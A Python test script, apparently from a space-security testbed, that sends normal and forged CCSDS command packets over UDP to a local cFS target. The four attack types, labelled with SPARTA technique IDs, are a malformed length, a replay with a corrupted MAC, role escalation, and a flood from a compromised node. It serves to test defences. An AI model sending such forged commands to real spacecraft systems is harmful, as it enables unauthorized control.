import socket
import struct
import time

TARGET_IP = "127.0.0.1"
TARGET_PORT = 1234
ZTA_SECRET_KEY = 0x5A7A2026

def compute_mac(data: bytes) -> int:
    h = (2166136261 ^ ZTA_SECRET_KEY) & 0xFFFFFFFF
    for b in data:
        h ^= b
        h = (h * 16777619) & 0xFFFFFFFF
    return h

def build_packet(pkt_type: str) -> bytes:
    msg_id = 0x1880
    seq_ctrl = 0xC000
    payload = b'\x00\x00\xDE\xAD\xBE\xEF'
    ccsds_len = 5  # 정상: 6B - 1 = 5

    role = 0x01    # FlightOps (정상 권한)
    src_id = 0x01  # Normal Ground Station
    expiry = int(time.time()) + 60
    corrupt_mac = False

    if pkt_type == "ATK1_MALFORM":
        # SPARTA EX-0013.02: 길이 변조 입력 (Legacy는 통과, TE-20/22에서 차단)
        ccsds_len = 3
    elif pkt_type == "ATK2_REPLAY":
        # SPARTA EX-0001.01 / IA-0008.01: 만료된 토큰 재전송 및 MAC 변조 (TE-09에서 차단)
        expiry = int(time.time()) - 60
        corrupt_mac = True
    elif pkt_type == "ATK3_ABAC":
        # SPARTA IA-0007.02: 정상 인증이나 저권한(0x02)으로 핵심 앱 제어 시도 (TE-04에서 차단)
        role = 0x02
    elif pkt_type == "ATK4_LOS_FLOOD":
        # SPARTA EX-0013.01: LOS 구간 침해 노드(0x02)의 반복 명령 유입 (TE-15에서 자율 격리)
        src_id = 0x02

    ccsds = struct.pack('>HHH', msg_id, seq_ctrl, ccsds_len) + payload
    meta = struct.pack('>BBI', role, src_id, expiry)
    mac = compute_mac(ccsds + meta)
    if corrupt_mac:
        mac ^= 0xFFFFFFFF
    return ccsds + meta + struct.pack('>I', mac)

def run():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    types = ["NORMAL", "ATK1_MALFORM", "ATK2_REPLAY", "ATK3_ABAC", "ATK4_LOS_FLOOD"]
    total = 1000
    print(f"[*] Sending {total} packets (200 each of 5 types)...")
    for i in range(total):
        pkt = build_packet(types[i % 5])
        sock.sendto(pkt, (TARGET_IP, TARGET_PORT))
        time.sleep(0.05)  # cFS 처리 속도(20 pkt/s) 맞춤
    sock.close()
    print("[+] Done. Waiting 1s...")
    time.sleep(1)

if __name__ == "__main__":
    run()
